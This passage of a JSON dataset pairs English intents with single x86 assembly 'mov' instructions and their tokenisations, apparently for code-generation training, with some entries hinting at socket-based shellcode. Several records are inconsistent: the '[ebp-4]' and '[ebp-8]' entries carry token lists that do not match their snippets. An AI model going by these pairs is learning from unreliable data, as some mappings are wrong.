    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "b"
    ]
  },
  {
    "intent": "move buff to eax",
    "rewritten_intent": "move buff to eax",
    "snippet": "mov eax, buff",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "buff",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buff"
    ]
  },
  {
    "intent": "move the memory address of buffer variable into eax",
    "rewritten_intent": "move the memory address of buffer variable into eax",
    "snippet": "mov eax, buffer",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "memory",
      "address",
      "buffer",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buffer"
    ]
  },
  {
    "intent": "move the address of buzz string into eax",
    "rewritten_intent": "move the address of buzz string into eax",
    "snippet": "mov eax, buzz",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "buzz",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buzz"
    ]
  },
  {
    "intent": "move c to eax",
    "rewritten_intent": "move c to eax",
    "snippet": "mov eax, c",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "c",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "c"
    ]
  },
  {
    "intent": "move childmsg into eax",
    "rewritten_intent": "move childmsg into eax",
    "snippet": "mov eax, childmsg",
    "slot_map": {
      "childmsg": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "copy the contents of ebx into eax register",
    "rewritten_intent": "copy the contents of ebx into eax register",
    "snippet": "mov eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "copy",
      "contents",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "copy what is in ebx into eax",
    "rewritten_intent": "copy what is in ebx into eax",
    "snippet": "mov eax, ebx",
    "slot_map": {
      "what": "var0",
      "ebx": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "copy",
      "var0",
      "var1",
      "var2"
    ],
    "snippet_tokens": [
      "mov",
      "var2",
      ",",
      "var1"
    ]
  },
  {
    "intent": "move ebx to eax",
    "rewritten_intent": "move ebx to eax",
    "snippet": "mov eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address in ebx into eax",
    "rewritten_intent": "move the address in ebx into eax",
    "snippet": "mov eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "transfer ebx to eax",
    "rewritten_intent": "transfer ebx to eax",
    "snippet": "mov eax, ebx",
    "slot_map": {
      "ebx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "transfer",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value in ecx into eax",
    "rewritten_intent": "move the value in ecx into eax",
    "snippet": "mov eax, ecx",
    "slot_map": {
      "ecx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value of ecx into eax",
    "rewritten_intent": "move the value of ecx into eax",
    "snippet": "mov eax, ecx",
    "slot_map": {
      "ecx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move edx into eax",
    "rewritten_intent": "move edx into eax",
    "snippet": "mov eax, edx",
    "slot_map": {
      "edx": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the remainder into eax",
    "rewritten_intent": "move the remainder into eax",
    "snippet": "mov eax, edx",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "remainder",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "edx"
    ]
  },
  {
    "intent": "move esi into eax",
    "rewritten_intent": "move esi into eax",
    "snippet": "mov eax, esi",
    "slot_map": {
      "esi": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move stack pointer to eax",
    "rewritten_intent": "move stack pointer to eax",
    "snippet": "mov eax, esp",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "stack",
      "pointer",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the address of the current stack pointer into eax",
    "rewritten_intent": "move the address of the current stack pointer into eax",
    "snippet": "mov eax, esp",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "current",
      "stack",
      "pointer",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the memory address of filecontents variable into eax",
    "rewritten_intent": "move the memory address of filecontents variable into eax",
    "snippet": "mov eax, filecontents",
    "slot_map": {
      "filecontents": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "memory",
      "address",
      "var0",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address of fizz string into eax",
    "rewritten_intent": "move the address of fizz string into eax",
    "snippet": "mov eax, fizz",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "fizz",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "fizz"
    ]
  },
  {
    "intent": "move key into eax",
    "rewritten_intent": "move key into eax",
    "snippet": "mov eax, key",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "key",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "key"
    ]
  },
  {
    "intent": "move m_src to eax",
    "rewritten_intent": "move m_src to eax",
    "snippet": "mov eax, m_src",
    "slot_map": {
      "m_src": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address of msg string into eax",
    "rewritten_intent": "move the address of msg string into eax",
    "snippet": "mov eax, msg",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "msg",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "msg"
    ]
  },
  {
    "intent": "move msg1 string into eax",
    "rewritten_intent": "move msg1 string into eax",
    "snippet": "mov eax, msg1",
    "slot_map": {
      "msg1": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address of msg1 into eax",
    "rewritten_intent": "move the address of msg1 into eax",
    "snippet": "mov eax, msg1",
    "slot_map": {
      "msg1": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address of msg2 into eax",
    "rewritten_intent": "move the address of msg2 into eax",
    "snippet": "mov eax, msg2",
    "slot_map": {
      "msg2": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address of msg3 into eax",
    "rewritten_intent": "move the address of msg3 into eax",
    "snippet": "mov eax, msg3",
    "slot_map": {
      "msg3": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move mxcsr to eax",
    "rewritten_intent": "move mxcsr to eax",
    "snippet": "mov eax, mxcsr",
    "slot_map": {
      "mxcsr": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move n_src to eax",
    "rewritten_intent": "move n_src to eax",
    "snippet": "mov eax, n_src",
    "slot_map": {
      "n_src": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move parentmsg into eax",
    "rewritten_intent": "move parentmsg into eax",
    "snippet": "mov eax, parentmsg",
    "slot_map": {
      "parentmsg": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move address of response variable into eax",
    "rewritten_intent": "move address of response variable into eax",
    "snippet": "mov eax, response",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "response",
      "variable",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "response"
    ]
  },
  {
    "intent": "move the number of bytes of var4 into eax",
    "rewritten_intent": "move the number of bytes of var4 into eax",
    "snippet": "mov eax, type var4",
    "slot_map": {
      "var4": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "move",
      "number",
      "bytes",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "type",
      "var0"
    ]
  },
  {
    "intent": "place address of buffer into ebp",
    "rewritten_intent": "place address of buffer into ebp",
    "snippet": "mov ebp, buff",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "place",
      "address",
      "buffer",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buff"
    ]
  },
  {
    "intent": "move eax to ebp",
    "rewritten_intent": "move eax to ebp",
    "snippet": "mov ebp, eax",
    "slot_map": {
      "eax": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move ecx into ebp",
    "rewritten_intent": "move ecx into ebp",
    "snippet": "mov ebp, ecx",
    "slot_map": {
      "ecx": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "point ebp to the esp register",
    "rewritten_intent": "point ebp to the esp register",
    "snippet": "mov ebp, esp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "esp",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "point ebp to top of stack",
    "rewritten_intent": "point ebp to top of stack",
    "snippet": "mov ebp, esp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "point",
      "var0",
      "top",
      "stack"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "set the new base pointer",
    "rewritten_intent": "set the new base pointer",
    "snippet": "mov ebp, esp",
    "slot_map": {},
    "intent_tokens": [
      "set",
      "new",
      "base",
      "pointer"
    ],
    "snippet_tokens": [
      "mov",
      "ebp",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register",
    "rewritten_intent": "move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register",
    "snippet": "mov ebx, [ebp-4]",
    "slot_map": {
      "ebp-4": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "location",
      "specified",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "ebp",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the contents of the address [ebp-4] into the ebx register",
    "rewritten_intent": "move the contents of the address [ebp-4] into the ebx register",
    "snippet": "mov ebx, [ebp-4]",
    "slot_map": {
      "ebp-4": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "move",
      "contents",
      "address",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "ebp",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register",
    "rewritten_intent": "move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register",
    "snippet": "mov ebx, [ebp-8]",
    "slot_map": {
      "ebp-8": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "location",
      "specified",
      "result",
      "operation",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "ebp",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the contents of the address [ebp-8] into the ebx register",
    "rewritten_intent": "move the contents of the address [ebp-8] into the ebx register",
    "snippet": "mov ebx, [ebp-8]",
    "slot_map": {
      "ebp-8": "var1",
      "[": "var0",
      "ebx": "var2"
    },
    "intent_tokens": [
      "move",
      "contents",
      "address",
      "[",
      "var1",
      "]",
      "var2",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "ebp",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move value at top of the stack to ebx",
    "rewritten_intent": "move value at top of the stack to ebx",
    "snippet": "mov ebx, [esp]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "value",
      "top",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "move effective address of my_table in ebx",
    "rewritten_intent": "move effective address of my_table in ebx",
    "snippet": "mov ebx, [my_table]",
    "slot_map": {
      "my_table": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "effective",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "save the effective address of my_table in ebx",
    "rewritten_intent": "save the effective address of my_table in ebx",
    "snippet": "mov ebx, [my_table]",
    "slot_map": {
      "my_table": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "save",
      "effective",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address temp2 to ebx",
    "rewritten_intent": "move the contents at memory address temp2 to ebx",
    "snippet": "mov ebx, [temp2]",
    "slot_map": {
      "temp2": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address x to ebx",
    "rewritten_intent": "move the contents at memory address x to ebx",
    "snippet": "mov ebx, [x]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "x",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "x",
      "]"
    ]
  },
  {
    "intent": "move the contents at memory address y to ebx",
    "rewritten_intent": "move the contents at memory address y to ebx",
    "snippet": "mov ebx, [y]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "contents",
      "memory",
      "address",
      "y",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "[",
      "y",
      "]"
    ]
  },
  {
    "intent": "exit with return code of 0",
    "rewritten_intent": "exit with return code of 0",
    "snippet": "mov ebx, 0",
    "slot_map": {},
    "intent_tokens": [
      "exit",
      "return",
      "code",
      "0"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "0"
    ]
  },
  {
    "intent": "return 0 status on exit",
    "rewritten_intent": "return 0 status on exit",
    "snippet": "mov ebx, 0",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "0",
      "status",
      "exit"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "0"
    ]
  },
  {
    "intent": "return a code of zero",
    "rewritten_intent": "return a code of zero",
    "snippet": "mov ebx, 0",
    "slot_map": {},
    "intent_tokens": [
      "return",
      "code",
      "zero"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "0"
    ]
  },
  {
    "intent": "specify file descriptor 0 as standard input",
    "rewritten_intent": "specify file descriptor 0 as standard input",
    "snippet": "mov ebx, 0",
    "slot_map": {},
    "intent_tokens": [
      "specify",
      "file",
      "descriptor",
      "0",
      "standard",
      "input"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "0"
    ]
  },
  {
    "intent": "use stdin",
    "rewritten_intent": "use stdin",
    "snippet": "mov ebx, 0",
    "slot_map": {
      "stdin": "var0"
    },
    "intent_tokens": [
      "use",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "0"
    ]
  },
  {
    "intent": "write to the stdin file",
    "rewritten_intent": "write to the stdin file",
    "snippet": "mov ebx, 0",
    "slot_map": {
      "stdin": "var0"
    },
    "intent_tokens": [
      "write",
      "var0",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "0"
    ]
  },
  {
    "intent": "move 0x1 into ebx",
    "rewritten_intent": "move 0x1 into ebx",
    "snippet": "mov ebx, 0x1",
    "slot_map": {
      "0x1": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move 0x4 into ebx",
    "rewritten_intent": "move 0x4 into ebx",
    "snippet": "mov ebx, 0x4",
    "slot_map": {
      "0x4": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the 32-bit value 0x40000 into register ebx",
    "rewritten_intent": "move the 32-bit value 0x40000 into register ebx",
    "snippet": "mov ebx, 0x40000",
    "slot_map": {
      "32-bit": "var0",
      "0x40000": "var1",
      "ebx": "var3"
    },
    "intent_tokens": [
      "move",
      "var0",
      "value",
      "var1",
      "register",
      "var3"
    ],
    "snippet_tokens": [
      "mov",
      "var3",
      ",",
      "var1"
    ]
  },
  {
    "intent": "move 0x5 into ebx",
    "rewritten_intent": "move 0x5 into ebx",
    "snippet": "mov ebx, 0x5",
    "slot_map": {
      "0x5": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the value 0xfee1dead into the ebx register",
    "rewritten_intent": "move the value 0xfee1dead into the ebx register",
    "snippet": "mov ebx, 0xfee1dead",
    "slot_map": {
      "0xfee1dead": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "value",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "file descriptor 1 standard output",
    "rewritten_intent": "file descriptor 1 standard output",
    "snippet": "mov ebx, 1",
    "slot_map": {},
    "intent_tokens": [
      "file",
      "descriptor",
      "1",
      "standard",
      "output"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "1"
    ]
  },
  {
    "intent": "invoke subroutine socket",
    "rewritten_intent": "invoke subroutine socket",
    "snippet": "mov ebx, 1",
    "slot_map": {},
    "intent_tokens": [
      "invoke",
      "subroutine",
      "socket"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "1"
    ]
  },
  {
    "intent": "move 1 into ebx",
    "rewritten_intent": "move 1 into ebx",
    "snippet": "mov ebx, 1",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "1",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "1"
    ]
  },
  {
    "intent": "specify file descriptor 1 standard output",
    "rewritten_intent": "specify file descriptor 1 standard output",
    "snippet": "mov ebx, 1",
    "slot_map": {},
    "intent_tokens": [
      "specify",
      "file",
      "descriptor",
      "1",
      "standard",
      "output"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "1"
    ]
  },
  {
    "intent": "use stdout",
    "rewritten_intent": "use stdout",
    "snippet": "mov ebx, 1",
    "slot_map": {
      "stdout": "var0"
    },
    "intent_tokens": [
      "use",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "1"
    ]
  },
  {
    "intent": "write to the stdout file",
    "rewritten_intent": "write to the stdout file",
    "snippet": "mov ebx, 1",
    "slot_map": {
      "stdout": "var0"
    },
    "intent_tokens": [
      "write",
      "var0",
      "file"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "1"
    ]
  },
  {
    "intent": "move decimal value 10 into ebx",
    "rewritten_intent": "move decimal value 10 into ebx",
    "snippet": "mov ebx, 10",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "decimal",
      "value",
      "10",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "10"
    ]
  },
  {
    "intent": "invoke subroutine bind",
    "rewritten_intent": "invoke subroutine bind",
    "snippet": "mov ebx, 2",
    "slot_map": {},
    "intent_tokens": [
      "invoke",
      "subroutine",
      "bind"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "2"
    ]
  },
  {
    "intent": "specify file descriptor 2 standard error",
    "rewritten_intent": "specify file descriptor 2 standard error",
    "snippet": "mov ebx, 2",
    "slot_map": {},
    "intent_tokens": [
      "specify",
      "file",
      "descriptor",
      "2",
      "standard",
      "error"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "2"
    ]
  },
  {
    "intent": "invoke subroutine connect",
    "rewritten_intent": "invoke subroutine connect",
    "snippet": "mov ebx, 3",
    "slot_map": {},
    "intent_tokens": [
      "invoke",
      "subroutine",
      "connect"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "3"
    ]
  },
  {
    "intent": "move 3 to the ebx register",
    "rewritten_intent": "move 3 to the ebx register",
    "snippet": "mov ebx, 3",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "3",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "3"
    ]
  },
  {
    "intent": "move decimal number 3 into ebx",
    "rewritten_intent": "move decimal number 3 into ebx",
    "snippet": "mov ebx, 3",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "decimal",
      "number",
      "3",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "3"
    ]
  },
  {
    "intent": "invoke subroutine listen",
    "rewritten_intent": "invoke subroutine listen",
    "snippet": "mov ebx, 4",
    "slot_map": {},
    "intent_tokens": [
      "invoke",
      "subroutine",
      "listen"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "4"
    ]
  },
  {
    "intent": "invoke subroutine accept",
    "rewritten_intent": "invoke subroutine accept",
    "snippet": "mov ebx, 5",
    "slot_map": {},
    "intent_tokens": [
      "invoke",
      "subroutine",
      "accept"
    ],
    "snippet_tokens": [
      "mov",
      "ebx",
      ",",
      "5"
    ]
  },
  {
    "intent": "move 5 into ebx",
    "rewritten_intent": "move 5 into ebx",
    "snippet": "mov ebx, 5",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "5",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "5"
    ]
  },
  {
    "intent": "move number 9 into ebx",
    "rewritten_intent": "move number 9 into ebx",
    "snippet": "mov ebx, 9",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "number",
      "9",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "9"
    ]
  },
  {
    "intent": "move buff to ebx",
    "rewritten_intent": "move buff to ebx",
    "snippet": "mov ebx, buff",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "buff",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "buff"
    ]
  },
  {
    "intent": "move command into ebx",
    "rewritten_intent": "move command into ebx",
    "snippet": "mov ebx, command",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "command",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "command"
    ]
  },
  {
    "intent": "move dword 0x5090508f into ebx",
    "rewritten_intent": "move dword 0x5090508f into ebx",
    "snippet": "mov ebx, dword 0x5090508f",
    "slot_map": {
      "0x5090508f": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "dword",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "move dword 0x50905091 into ebx",
    "rewritten_intent": "move dword 0x50905091 into ebx",
    "snippet": "mov ebx, dword 0x50905091",
    "slot_map": {
      "0x50905091": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "dword",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "move the address in eax into ebx",
    "rewritten_intent": "move the address in eax into ebx",
    "snippet": "mov ebx, eax",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "address",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the contents of the eax register into the ebx register",
    "rewritten_intent": "move the contents of the eax register into the ebx register",
    "snippet": "mov ebx, eax",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "contents",
      "var0",
      "register",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move eax into ebx",
    "rewritten_intent": "move eax into ebx",
    "snippet": "mov ebx, eax",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move ecx into ebx",
    "rewritten_intent": "move ecx into ebx",
    "snippet": "mov ebx, ecx",
    "slot_map": {
      "ecx": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "backup ecx into ebx",
    "rewritten_intent": "backup ecx into ebx",
    "snippet": "mov ebx, ecx",
    "slot_map": {
      "ecx": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "backup",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move edi into ebx",
    "rewritten_intent": "move edi into ebx",
    "snippet": "mov ebx, edi",
    "slot_map": {
      "edi": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move edx into ebx",
    "rewritten_intent": "move edx into ebx",
    "snippet": "mov ebx, edx",
    "slot_map": {
      "edx": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move esi into ebx",
    "rewritten_intent": "move esi into ebx",
    "snippet": "mov ebx, esi",
    "slot_map": {
      "esi": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "move",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mov",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "move the address of the character on the stack into ebx",
    "rewritten_intent": "move the address of the character on the stack into ebx",
    "snippet": "mov ebx, esp",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "move",
      "address",
      "character",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "mov",
      "var0",
      ",",
      "esp"
    ]
  },
  {
    "intent": "move the contents of the esp register into the ebx register",
